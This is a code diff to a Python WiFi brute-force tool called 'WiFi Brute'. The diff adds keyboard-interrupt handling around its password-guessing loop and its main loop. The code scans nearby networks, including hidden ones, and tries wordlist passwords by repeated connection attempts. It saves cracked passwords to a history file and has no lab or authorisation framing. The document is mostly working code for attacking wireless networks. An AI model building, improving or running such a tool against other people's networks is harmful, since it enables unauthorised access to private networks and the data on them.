@@ -110,42 +110,48 @@ class WifiCracker:
         terminal_width = get_terminal_size()[0]
         
         self.idx = 0
-        while self.idx < self.total_passwords:
-            if terminal_width != get_terminal_size()[0]:
-                clear()
-                terminal_width = get_terminal_size()[0]
-            if self.stop_cracking:
-                return None
-            
-            self.current_password = self.passwords[self.idx]
-            
-            if ssid in self.attempted_passwords and self.current_password in self.attempted_passwords[ssid]:
-                self.idx += 1
-                continue
-            
-            if not self.paused:
-                self.print_status_line()
-
-            while self.paused:
-                time.sleep(0.1)
+        try:
+            while self.idx < self.total_passwords:
+                if terminal_width != get_terminal_size()[0]:
+                    clear()
+                    terminal_width = get_terminal_size()[0]
                 if self.stop_cracking:
                     return None
+                
+                self.current_password = self.passwords[self.idx]
+                
+                if ssid in self.attempted_passwords and self.current_password in self.attempted_passwords[ssid]:
+                    self.idx += 1
+                    continue
+                
+                if not self.paused:
+                    self.print_status_line()
 
-            result = self.connect_to_wifi(ssid, self.current_password, is_hidden)
-            
-            if result is None:
-                continue
-            
-            if self.stop_cracking:
-                return None
-            
-            self.save_to_history(ATTEMPTED_PASSWORDS_FILE, ssid, self.current_password)
-            if result:
-                self.attempted_passwords[ssid].add(self.current_password)
-                print_status(f"Password found for {ssid}: {self.current_password}", "SUCCESS", start_color='#A020F0')
-                return self.current_password
+                while self.paused:
+                    time.sleep(0.1)
+                    if self.stop_cracking:
+                        return None
 
-            self.idx += 1
+                result = self.connect_to_wifi(ssid, self.current_password, is_hidden)
+                
+                if result is None:
+                    continue
+                
+                if self.stop_cracking:
+                    return None
+                
+                self.save_to_history(ATTEMPTED_PASSWORDS_FILE, ssid, self.current_password)
+                if result:
+                    self.attempted_passwords[ssid].add(self.current_password)
+                    print_status(f"Password found for {ssid}: {self.current_password}", "SUCCESS", start_color='#A020F0')
+                    return self.current_password
+
+                self.idx += 1
+ 
+        except KeyboardInterrupt:
+            print("\n")
+            print_status(f"Cracking process for {ssid} interrupted by user", "WARNING", success=False)
+            return None
 
         print_status(f"No password found for {ssid}", "FAILED", success=False)
         return None
@@ -246,56 +252,61 @@ def main():
     interface = pywifi.PyWiFi().interfaces()[0]
     cracker = WifiCracker(interface, args.timeout, args.wordlist)
 
-    while True:
-        networks = cracker.scan_wifi()
-        networks = sorted({network.ssid: network for network in networks}.values(), key=lambda x: x.signal, reverse=True)
-        print_status(f"Number of unique WiFi networks found: {len(networks)}", "INFO")
-        
-        selected_networks = select_networks(networks)
-        if not confirm_action("Start cracking?"):
+    try:
+        while True:
+            networks = cracker.scan_wifi()
+            networks = sorted({network.ssid: network for network in networks}.values(), key=lambda x: x.signal, reverse=True)
+            print_status(f"Number of unique WiFi networks found: {len(networks)}", "INFO")
+            
+            selected_networks = select_networks(networks)
+            if not confirm_action("Start cracking?"):
+                clear()
+                continue
+
+            _, pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
             clear()
-            continue
-
-        _, pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
-        clear()
-        print_header("Cracking Shortcuts")
-        sprint("Press 'p' to pause/unpause.", delay=0.0005)
-        sprint("Press 'q' to stop cracking.", delay=0.0005)
-        
-        keyboard_thread = threading.Thread(target=cracker.handle_keyboard_input)
-        keyboard_thread.start()
-
-        hidden_count = 0
-        for i, network in enumerate(selected_networks, 1):
-            if cracker.stop_cracking:
-                break
+            print_header("Cracking Shortcuts")
+            sprint("Press 'p' to pause/unpause.", delay=0.0005)
+            sprint("Press 'q' to stop cracking.", delay=0.0005)
             
-            ssid = network.ssid or f"Hidden Network {hidden_count + 1}"
-            hidden_count += 1
-            password = cracker.crack_wifi(ssid, not network.ssid)
-            if password:
-                if ssid not in cracker.cracked_passwords:
-                    cracker.cracked_passwords[ssid] = {password}
-                    cracker.save_to_history(CRACKED_PASSWORDS_FILE, ssid, password)
-            
-            if i < len(selected_networks) and not cracker.stop_cracking:
-                if not confirm_action("Continue cracking the next network?"):
+            keyboard_thread = threading.Thread(target=cracker.handle_keyboard_input)
+            keyboard_thread.start()
+
+            hidden_count = 0
+            for i, network in enumerate(selected_networks, 1):
+                if cracker.stop_cracking:
                     break
+                
+                ssid = network.ssid or f"Hidden Network {hidden_count + 1}"
+                hidden_count += 1
+                password = cracker.crack_wifi(ssid, not network.ssid)
+                if password:
+                    if ssid not in cracker.cracked_passwords:
+                        cracker.cracked_passwords[ssid] = {password}
+                        cracker.save_to_history(CRACKED_PASSWORDS_FILE, ssid, password)
+                
+                if i < len(selected_networks) and not cracker.stop_cracking:
+                    if not confirm_action("Continue cracking the next network?"):
+                        break
 
-        cracker.stop_cracking = True
-        keyboard_thread.join()
-        
-        if not confirm_action("Scan for networks again?"):
-            break
+            cracker.stop_cracking = True
+            keyboard_thread.join()
+            
+            if not confirm_action("Scan for networks again?"):
+                break
 
+            clear()
+            banner(show_logo=True)
+            cracker.paused = False
+            cracker.stop_cracking = False
+
+    except KeyboardInterrupt:
+        print("\n")
+        print_status("Program forcefully exited by user", "WARNING", success=False)
+    finally:
         clear()
         banner(show_logo=True)
-        cracker.paused = False
-        cracker.stop_cracking = False
-
-    clear()
-    banner(show_logo=True)
-    gradient_print("Thank you for using WiFi Brute. Goodbye!")
+        gradient_print("Thank you for using WiFi Brute. Goodbye!")
 
 if __name__ == "__main__":
     main()
